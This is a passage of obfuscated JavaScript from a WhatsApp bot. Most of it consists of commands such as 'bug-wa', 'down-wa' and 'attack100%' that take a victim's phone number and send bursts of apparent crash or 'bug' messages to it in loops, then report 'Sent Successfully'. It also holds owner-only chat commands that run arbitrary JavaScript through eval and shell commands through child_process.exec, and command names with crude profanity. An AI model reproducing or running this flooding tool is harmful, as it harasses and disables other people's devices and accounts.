          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await sleep(10000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "bug-txt1":
      case "bug-txt2":
      case "bug-txt3":
      case "bug-txt4":
      case "bug-txt5":
      case "bug-txt6":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x2c31fe = 0; _0x2c31fe < 5; _0x2c31fe++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x334b12 = {
            text: _0x4bbbca
          };
          const _0x3b15b0 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x334b12, _0x3b15b0);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x52370f = {
            text: _0x4bbbca
          };
          const _0x104908 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x52370f, _0x104908);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x8db3e9 = {
            text: _0x4bbbca
          };
          const _0x335d09 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x8db3e9, _0x335d09);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x3f01ad = {
            text: _0x4bbbca
          };
          const _0x191c47 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x3f01ad, _0x191c47);
          await sleep(4000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x5ea640 = {
            text: _0x4bbbca
          };
          const _0x352884 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x5ea640, _0x352884);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x8c5deb = {
            text: _0x4bbbca
          };
          const _0x2e1197 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x8c5deb, _0x2e1197);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x4c6cdd = {
            text: _0x4bbbca
          };
          const _0x46de54 = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x4c6cdd, _0x46de54);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          const _0x29b7d1 = {
            text: _0x4bbbca
          };
          const _0x53919a = {
            quoted: _0x2cdb40
          };
          await _0x2f9d2e.sendMessage(Pe, _0x29b7d1, _0x53919a);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "tiktokmp3":
        {
          const _0x5abef1 = _0x2e306d => {
            _0x2e306d = _0x2e306d.replace(/(<br?\s?\/>)/gi, " \n");
            return _0x2e306d.replace(/(<([^>]+)>)/gi, '');
          };
          async function _0x56719c(_0xbb2971) {
            const _0x19d484 = {
              query: _0xbb2971
            };
            let _0x392301 = await axios("https://lovetik.com/api/ajax/search", {
              'method': "POST",
              'data': new URLSearchParams(Object.entries(_0x19d484))
            });
            let _0x3281d3 = {
              creator: "Tioxy",
              title: _0x5abef1(_0x392301.data.desc),
              author: _0x5abef1(_0x392301.data.author),
              nowm: await _0x2c7374,
              watermark: await _0x2c7374,
              audio: await _0x2c7374,
              thumbnail: await _0x2c7374
            };
            return _0x3281d3;
          }
          let _0x4c8afb = "[!] *wrong input*\n\t\nEx : " + (_0x11f9b4 + _0x63bd7f) + " https://vm.tiktok.com/ZSL7p9jRV/";
          if (!q) {
            return _0x41d276(_0x4c8afb);
          }
          _0x41d276("Tunggu");
          let _0x514eb2 = await _0x56719c(q);
          const _0x6604d4 = {
            url: _0x514eb2.audio
          };
          const _0x412ed2 = {
            audio: _0x6604d4,
            mimetype: "audio/mpeg",
            fileName: _0x514eb2.title + ".mp3",
            ptt: false
          };
          const _0x3145d1 = {
            quoted: _0x18a4d7
          };
          await _0x2f9d2e.sendMessage(_0x537416, _0x412ed2, _0x3145d1);
        }
        break;
      case "bug-wa1":
      case "bug-wa2":
      case "bug-wa3":
      case "bug-wa4":
      case "bug-wa5":
      case "bug-wa6":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x50a8d8 = 0; _0x50a8d8 < 5; _0x50a8d8++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await sleep(4000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x455c3d(Pe);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "gasajabray":
      case "down-wa":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x5dd0aa = 0; _0x5dd0aa < 5; _0x5dd0aa++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await sleep(2000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "memekslemeks":
      case "hai-bray":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x30f2e0 = 0; _0x30f2e0 < 5; _0x30f2e0++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await sleep(2000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x40fd73(Pe);
          await _0x4990de(Pe);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "ngentotmurbug":
      case "attack100%":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x390634 = 0; _0x390634 < 5; _0x390634++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await sleep(2000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "tesbeta":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4a22a7 = 0; _0x4a22a7 < 10; _0x4a22a7++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await sleep(4000);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x40fd73(Pe);
          await sleep(10000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "tesbetav2":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x32ba65 = 0; _0x32ba65 < 10; _0x32ba65++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await sleep(4000);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x565e47);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await sleep(10000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      default:
        if (_0x30577f.startsWith('=>')) {
          if (!_0x4cefc4) {
            return _0x41d276("*Only Vip*");
          }
          try {
            _0x41d276(util.format(eval("(async () => { return " + _0x30577f.slice(3) + " })()")));
          } catch (_0x55e02b) {
            _0x41d276(String(_0x55e02b));
          }
        }
        if (_0x30577f.startsWith('>')) {
          if (!_0x4cefc4) {
            return;
          }
          try {
            let _0xbb76c7 = await eval(_0x30577f.slice(2));
            if (typeof _0xbb76c7 !== "string") {
              _0xbb76c7 = require("util").inspect(_0xbb76c7);
            }
            await _0x41d276(_0xbb76c7);
          } catch (_0x334bc8) {
            await _0x41d276(String(_0x334bc8));
          }
        }
        if (_0x30577f.startsWith('$')) {
          if (!_0x4cefc4) {
            return;
          }
          require("child_process").exec(_0x30577f.slice(2), (_0x452d87, _0x29bd61) => {
            if (_0x452d87) {
              return _0x41d276('' + _0x452d87);
            }
            if (_0x29bd61) {
              return _0x41d276(_0x29bd61);
            }
          });
        }
    }
  } catch (_0x349fef) {
    _0x2f9d2e.sendMessage(_0x18a4d7.chat, {
      'text': require("util").format(_0x349fef)
    }, {
      'quoted': _0x18a4d7
    });
    console.log("[1;31m" + _0x349fef + "[0m");
  }
};
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});